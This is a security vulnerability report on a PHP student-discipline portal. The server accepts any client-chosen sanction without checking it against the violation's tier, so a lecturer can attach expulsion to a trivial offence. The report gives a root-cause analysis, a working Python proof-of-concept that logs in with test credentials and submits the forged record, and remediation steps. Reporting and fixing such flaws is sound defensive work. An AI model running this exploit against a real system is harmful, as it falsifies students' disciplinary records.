# Sanction Level Not Validated Against Violation Tier (client-selectable sanksi)

**ID:** vuln-0001
**Severity:** MEDIUM
**Found:** 2026-09-21 14:58:50 UTC
**Target:** http://172.17.112.1:8001
**Endpoint:** /action/pelanggaran
**Method:** POST
**CWE:** CWE-20
**CVSS:** 6.5
**Fix Effort:** Low

## Description

When a lecturer records a violation, the sanction (`sanksi`) is taken from a client-supplied token and stored without verifying that the sanction's tier matches the violation's tier. A lecturer can therefore attach the most severe sanction (Tier I — expulsion) to a trivial Tier V violation (2 points), or any other mismatched combination. The student portal renders the mismatched sanction as authoritative.

## Evidence

### Request (lecturer session)

```http
POST /action/pelanggaran HTTP/1.1
Host: 172.17.112.1:8001
Cookie: PHPSESSID=<dosen-session>
Content-Type: application/x-www-form-urlencoded

csrf_token=<dosen-csrf>&jenisPelanggaran=<Tier-V tatib token>&sanksi=<Tier-I sanksi token>&deskripsiPelanggaran=mismatch+PoC&nim=2341238901&store=1
```

### Response

```http
HTTP/1.1 302 Found
Location: /pelanggaran/dosen
```

### Resulting record as rendered to the student (`GET /pelanggaran`, mahasiswa `2341238901`)

```html
<tr data-table-row
    data-table-search="berkomunikasi dengan tidak sopan ... diberhentikan sebagai mahasiswa dr. andi wijaya pending v"
    data-table-filter-tingkat="v">
  ...
  Berkomunikasi dengan tidak sopan, baik tertulis atau tidak tertulis ...   <!-- violation, Tier V, 2 points -->
  V                                                                          <!-- tier pill -->
  Diberhentikan sebagai mahasiswa                                            <!-- Tier I sanction -->
</tr>
```

The row simultaneously reports tier `V` (2 points, trivial) and the Tier I sanction "Diberhentikan sebagai mahasiswa". A control request that omits `sanksi` (letting the server pick the tier-consistent default) renders the correct Tier V sanction "Teguran lisan disertai dengan surat pernyataan ...", demonstrating the mismatch is caused solely by the client-supplied `sanksi` field. The same swap applied via the update path returned `302` with "Data pelanggaran berhasil diupdate."

## Impact

The integrity of the disciplinary record is broken: a student can be shown a sanction that is far more severe than the actual violation warrants (e.g. "Diberhentikan sebagai mahasiswa" / expelled, or "Dinonaktifkan (Cuti Akademik) selama dua semester") for a minor 2-point infraction. Because the student portal presents this as the authoritative outcome, it can cause significant distress, reputational harm, and support fraudulent escalation. The same mismatch is accepted on the edit/update path, so existing records can be tampered with. This is a server-side data-integrity flaw: the sanction is effectively attacker-selected rather than derived from the violation.

## Technical Analysis

## Root cause

The violation save handler resolves the sanction straight from the client POST field without any tier/point cross-check:

```php title=request/handler-pelanggaran.php startLineNumber=165 endLineNumber=179
$tatibDetail = $tatibController->getTatibDetail($tatibId);
$tingkat = $tatibDetail['tingkat'] ?? '';
$resolvedSanksi = null;
if (isset($_POST['sanksi']) && trim((string) $_POST['sanksi']) !== '') {
    $resolvedSanksi = app_id_resolve((string) $_POST['sanksi'], 'sanksi');
    if ($resolvedSanksi === null) {
        throw new RuntimeException('Token sanksi tidak valid.');
    }
}
$detailPelanggaran = $_POST['deskripsiPelanggaran'] ?? ($tatibDetail['deskripsi'] ?? null);

// Only used as a FALLBACK when the client omits `sanksi`:
if ((!$resolvedSanksi || trim((string) $resolvedSanksi) === '') && $tingkat !== '') {
    $resolvedSanksi = $pelanggaranController->getDefaultSanksiByTingkat($tingkat);
}
```

The tier is correctly derived server-side from the selected `TATA_TERTIB` row (`$tingkat`), and points (`poin`) are read from `TATA_TERTIB` at render time, so neither can be forged directly. However, the explicitly supplied `sanksi` overrides the tier-consistent default and is **never compared** against `$tingkat`.

The model performs only an existence check — it confirms the sanction row exists but never reads or compares its `tingkat`:

```php title=models/Pelanggaran.php startLineNumber=299 endLineNumber=302
$stmtSanksi = $this->connect->prepare("SELECT id_sanksi FROM SANKSI WHERE id_sanksi = ? LIMIT 1");
$stmtSanksi->execute([$idSanksi]);
if (!$stmtSanksi->fetch(PDO::FETCH_ASSOC)) {
    throw new RuntimeException('Sanksi tidak valid.');
}
```

The same pattern exists in `updateDetailPelanggaran` (lines 447-450), so the mismatch is also accepted when editing an existing record.

The `SANKSI` table stores a per-row `tingkat` (I..V), and the edit form already exposes `data-tingkat` on each sanction `<option>`, proving the tier is available server-side and simply not enforced.

## Impact
A sanction of Tier I (e.g. "Diberhentikan sebagai mahasiswa" — expulsion) can be stored against a Tier V violation worth 2 points ("Berkomunikasi dengan tidak sopan"). The student view (`pelanggaran-page.php`) renders both the tier and the sanction, producing an internally contradictory and grossly overstated record.

## CVSS notes
- Attack vector Network, low complexity (replay of legitimate form with one field swapped), low privileges (any lecturer), no user interaction.
- Confidentiality: none — this is a data-integrity / availability-of-trust issue. Integrity High (records can be arbitrarily mislabeled); the record is the authoritative disciplinary artifact.

## Proof of Concept

1. Authenticate as any lecturer (e.g. `1234567890` / `password123`) and open the reporting page (`/pelaporan`) to obtain a session-bound CSRF token and the `jenisPelanggaran` (tata-tertib) token list.
2. Select a Tier V violation (e.g. "Berkomunikasi dengan tidak sopan", 2 points) as `jenisPelanggaran`.
3. Obtain a Tier I `sanksi` token from any edit page (`/pelaporan/edit?id_detail=...`, each `<option>` under the `sanksi` select carries its token). Choose the option whose description is "Diberhentikan sebagai mahasiswa".
4. Submit `POST /action/pelanggaran` with both tokens, the CSRF token, a target `nim`, and `store=1`.
5. The response is `302` to `/pelanggaran/dosen` (success).
6. Request `/pelanggaran` as the affected student (`2341238901` / `password123`); the row shows Tier `V` with sanction "Diberhentikan sebagai mahasiswa".
7. The same swap works on the update path by additionally sending `update=1` and a valid `id_detail` token.

```python

s = requests.Session()

# 1. login as lecturer

s.post(BASE + "/action/login", data={
    "csrf_token": csrf, "username": "1234567890",
    "password": "password123", "user_type": "dosen"})

# 2. reporting page: CSRF + Tier V tata-tertib token
rep = s.get(BASE + "/pelaporan").text
csrf = re.search(r'data-csrf-token="([^"]+)"', rep).group(1)
tatib = re.findall(r'<option\s+value="([^"]+)"\s+data-tingkat="([^"]+)"', rep)
v_tatib = next(t for t, lvl in tatib if lvl == "V")          # Tier V, 2 points

# 3. any edit page exposes sanction tokens with their tier
dos = s.get(BASE + "/pelanggaran/dosen").text
edit_id = re.search(r'href="/pelaporan/edit\?id_detail=([^"]+)"', dos).group(1)
edit = s.get(BASE + "/pelaporan/edit?id_detail=" + edit_id).text
sanksi = re.findall(r'<option value="([^"]+)"\s+data-tingkat="([^"]+)"', edit)
i_sanksi = next(t for t, lvl in sanksi if lvl == "I")        # Tier I (expulsion)

# 4. create violation: Tier V violation + Tier I sanction
r = s.post(BASE + "/action/pelanggaran", data={
    "csrf_token": csrf,
    "jenisPelanggaran": v_tatib,      # tier derives to V server-side
    "sanksi": i_sanksi,               # NOT validated against tier -> accepted
    "deskripsiPelanggaran": "mismatch PoC",
    "nim": "2341238901",
    "store": "1",
})
print("create ->", r.status_code, r.headers.get("Location"))

# 5. victim view
v = requests.Session()
l = v.get(BASE + "/login").text
t = re.search(r'name="csrf_token"\s+value="([^"]+)"', l).group(1)
v.post(BASE + "/action/login", data={"csrf_token": t, "username": "2341238901",
                                     "password": "password123", "user_type": "mahasiswa"})
page = v.get(BASE + "/pelanggaran").text
row = re.search(r'(data-table-row[^>]*berkomunikasi dengan tidak sopan[^>]*)', page)
print("mismatched row present:", bool(row and "Diberhentikan sebagai mahasiswa" in row.group(1)))
```

## Remediation

1. Derive the sanction from the violation tier server-side and do not accept an arbitrary client-selected sanction. If a lecturer must be able to choose among the sanctions valid for a tier, first load the violation's `tingkat` server-side and constrain the choice to sanction rows whose `SANKSI.tingkat` equals that tier.
2. Enforce the tier-match inside the model by selecting the sanction together with its tier and comparing it to the tata-tertib tier before insert/update, e.g. `SELECT id_sanksi, tingkat FROM SANKSI WHERE id_sanksi = ?` and reject when `upper(tingkat) !== upper($tatibTingkat)`.
3. Apply the same validation on the update path (`updateDetailPelanggaran`) so existing records cannot be tampered with.
4. As defense-in-depth, add a database-level integrity constraint or trigger ensuring `DETAIL_PELANGGARAN.id_sanksi` references a sanction whose tier matches the referenced `TATA_TERTIB.tingkat`.
5. Validate the response rendering so that a record whose sanction tier differs from its violation tier is never displayed as authoritative.

## Assumptions

An authenticated lecturer account is required (low privilege, self-service role). The attacker needs one legitimate form submission with a single field changed; no special tooling. The tier of the sanction list is already exposed to the client in the edit form, so selecting any tier is trivial. Impact is assessed as record integrity / trust, since the stored record is the authoritative disciplinary artifact shown to students; it is not a confidentiality leak.
